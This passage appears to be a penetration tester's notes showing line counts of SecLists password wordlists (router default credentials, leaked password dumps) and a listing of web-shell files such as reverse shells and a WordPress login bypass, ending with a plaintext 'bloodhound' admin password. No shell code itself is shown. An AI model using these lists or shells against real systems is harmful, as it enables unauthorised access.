        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tot_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaiomy_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel-lucent_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/western-digital_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/micronet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/rosewill_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cbn_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/adtran_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynamode_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/adtran_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/blitzz_default-users.txt
       11 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagemcom_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/asus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bt_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intracom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jensen-scandinavia_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airties_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sky_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sierra-wireless_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgear_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/pirelli_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/100fio-networks_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/tp-link_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlink-101_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tactio_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/great-speed_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/aztech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/benq_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/binatone_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dslink_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcomm_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/x-micro_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tactio_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagem_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/western-digital_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/samsung_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/edimax_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/westell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intelbras_default-users.txt
      168 /usr/share/seclists/Passwords/Default-Credentials/Routers/0ALL-USERNAMES-AND-PASSWORDS.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/open-networks_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jaht_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lg_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kraun_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/speedcom_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/prolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sonicwall_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/micronet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/smartrg_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sierra-wireless_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/tecom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/rosewill_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/askey_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airties_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/baudtec_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendchip_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/genexis_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/zyxel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/iball_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/scientific-atlanta_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlive_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3bb_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/creative_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/arris_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/xavi_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/addon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ice.net_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/hamlet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dslink_default-users.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/zhone_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ovislink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/msi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/allied-data_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/artnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mobily_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digisol_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/belkin_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/billion_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alvarion_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kozumi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mymax_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/nucom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lectron_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/davolink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eusso_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eltex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/medialink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradigm_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sercomm_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/nokia_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digicom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/humax_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/totolink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bec-technologies_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/arcadyan_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/v-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dell_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/motorola_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tp-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/geek-adsl_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intracom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/fiber-home_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel-lucent_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/artnet_default-passwords.txt
        9 /usr/share/seclists/Passwords/Default-Credentials/Routers/zte_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eltex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/q-tec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco-linksys_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/telewell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hot_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/belgacom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/amped-wireless_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/encore_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/draytek_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/d-link_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/buffalo_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/1net1_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/fiber-home_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zonet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mitrastar_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pronets_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/marconi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/baytec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/creative_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/net-lynx_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/asus_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digitus_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/thomson-alcatel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pace-plc_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/vtech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgate_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sparkcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dasan_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sweex_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/adb_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/repotec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/samsung_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airrouter_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/motorola_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dovado_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgear_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/iball_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/speedcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/zioncom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/aolynk_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/allied-data_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tot_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telindus_default-users.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/smc_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/acorp_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/iskratel_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/cnet_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubiquiti_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/encore_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/quicktel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pci_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/awb-networks_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teracom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/blitzz_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/nokia_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/zioncom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telindus_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/surecom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/acorp_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hot_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/asmax_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/starbridge_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sky_default-passwords.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/Routers/technicolor_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradyne_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/crypto_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ambit_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inexq_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dovado_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mymax_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bec-technologies_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lectron_default-passwords.txt
       21 /usr/share/seclists/Passwords/Default-Credentials/Routers/huawei_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/digicom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubiquiti_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlive_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/franklin-wireless_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/solwise_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/baytec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/quicktel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/etec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trust_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/fritz-box_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/1net1_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/pirelli_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3bb_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/soho_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kingtype_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/baudtec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pentagram_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/solwise_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/readynet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zonet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airrouter_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/green-packet_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubee_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/asmax_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mitrastar_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cd-r-king_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sercomm_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/utstarcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/davolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sparkcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pentagram_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zoom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynamode_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gateway_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/100fio-networks_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/amped-wireless_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/noganet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/v-link_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/edimax_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/loopcomm_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bt_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pluscom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/actiontec_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/genexis_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/binatone_default-users.txt
       67 /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/cryptominers.txt
       23 /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
       18 /usr/share/seclists/Passwords/Default-Credentials/avaya_defaultpasslist.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/db2-betterdefaultpasslist.txt
      716 /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt
      560 /usr/share/seclists/Passwords/Default-Credentials/telnet-phenoelit.txt
      112 /usr/share/seclists/Passwords/Default-Credentials/scada-pass.csv
       66 /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
       79 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt
       27 /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt
      135 /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
   755995 /usr/share/seclists/Passwords/xato-net-10-million-passwords-dup.txt
    84198 /usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt
  1471056 /usr/share/seclists/Passwords/darkc0de.txt
    31700 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_with_leet_variations.txt
     5567 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_original.txt
    15326 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_lowercase.txt
    15326 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_uppercase.txt
      181 /usr/share/seclists/Passwords/Malware/conficker.txt
       60 /usr/share/seclists/Passwords/Malware/mirai-botnet.txt
        4 /usr/share/seclists/Passwords/citrix.txt
  1652903 /usr/share/seclists/Passwords/bt4-password.txt
       82 /usr/share/seclists/Passwords/clarkson-university-82.txt
   172696 /usr/share/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_pt_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_tr_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_fr_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_es_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_en_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_de_vowels_no_compounds_top-1000000.txt
       13 /usr/share/seclists/Passwords/Keyboard-Walks/README.md
     9608 /usr/share/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
   279616 /usr/share/seclists/Passwords/Keyboard-Walks/walk-the-line.txt
     6240 /usr/share/seclists/Passwords/days.txt
```
```sh
└─$ find /usr/share/seclists/Web-Shells -type f -exec wc -l {} +  
    33 /usr/share/seclists/Web-Shells/FuzzDB/up.php
    76 /usr/share/seclists/Web-Shells/FuzzDB/list.jsp
   372 /usr/share/seclists/Web-Shells/FuzzDB/cmd.sh
    25 /usr/share/seclists/Web-Shells/FuzzDB/cmd.php
    43 /usr/share/seclists/Web-Shells/FuzzDB/up.sh
    32 /usr/share/seclists/Web-Shells/FuzzDB/list.php
    46 /usr/share/seclists/Web-Shells/FuzzDB/list.sh
    91 /usr/share/seclists/Web-Shells/FuzzDB/reverse.jsp
    17 /usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php
    35 /usr/share/seclists/Web-Shells/FuzzDB/cmd.jsp
   146 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
    42 /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
   454 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/proxy.asp
   179 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/file.asp
    83 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/shell.asp
   153 /usr/share/seclists/Web-Shells/laudanum-1.0/asp/dns.asp
    35 /usr/share/seclists/Web-Shells/laudanum-1.0/README
    99 /usr/share/seclists/Web-Shells/laudanum-1.0/cfm/shell.cfm
     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/cmd.war
     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/META-INF/MANIFEST.MF
    11 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/WEB-INF/web.xml
    41 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/warfiles/cmd.jsp
     3 /usr/share/seclists/Web-Shells/laudanum-1.0/jsp/makewar.sh
   107 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/laudanum.php
   182 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/file.php
    60 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/ipcheck.php
    66 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/settings.php
   103 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/killnc.php
   144 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/dns.php
   336 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/proxy.php
   194 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverse-shell.php
   126 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/host.php
   389 /usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
    14 /usr/share/seclists/Web-Shells/laudanum-1.0/CREDITS
   196 /usr/share/seclists/Web-Shells/laudanum-1.0/php/file.php
   119 /usr/share/seclists/Web-Shells/laudanum-1.0/php/killnc.php
   161 /usr/share/seclists/Web-Shells/laudanum-1.0/php/dns.php
   351 /usr/share/seclists/Web-Shells/laudanum-1.0/php/proxy.php
   192 /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php
   142 /usr/share/seclists/Web-Shells/laudanum-1.0/php/host.php
   409 /usr/share/seclists/Web-Shells/laudanum-1.0/php/shell.php
   258 /usr/share/seclists/Web-Shells/laudanum-1.0/GPL
   129 /usr/share/seclists/Web-Shells/laudanum-1.0/aspx/shell.aspx
     3 /usr/share/seclists/Web-Shells/JSP/simple-shell.jsp
    82 /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
    26 /usr/share/seclists/Web-Shells/WordPress/bypass-login.php
   772 /usr/share/seclists/Web-Shells/backdoor_list.txt
    87 /usr/share/seclists/Web-Shells/CFM/shell.cfm.html
    77 /usr/share/seclists/Web-Shells/Magento/newadmin-Inchoo.php
    69 /usr/share/seclists/Web-Shells/Magento/newadmin-KINKCreative.php
    59 /usr/share/seclists/Web-Shells/PHP/Dysco.php
    13 /usr/share/seclists/Web-Shells/PHP/another-obfuscated-phpshell.php
    22 /usr/share/seclists/Web-Shells/PHP/obfuscated-phpshell.php
    17 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/VtigerVulnPlugin.php
    25 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/manifest.xml
    28 /usr/share/seclists/Web-Shells/Vtiger/modules/VtigerVulnPlugin/actions/Gateway.php
    13 /usr/share/seclists/Web-Shells/Vtiger/README.md
    25 /usr/share/seclists/Web-Shells/Vtiger/manifest.xml
    25 /usr/share/seclists/Web-Shells/Vtiger/settings/actions/Gateway.php
     2 /usr/share/seclists/Web-Shells/Vtiger/languages/en_us/VtigerVulnPlugin.php
     2 /usr/share/seclists/Web-Shells/Vtiger/languages/en_us/Settings/VtigerVulnPlugin.php
  7047 total
```
</details>


### bloodhound
admin
bloodhounD1!
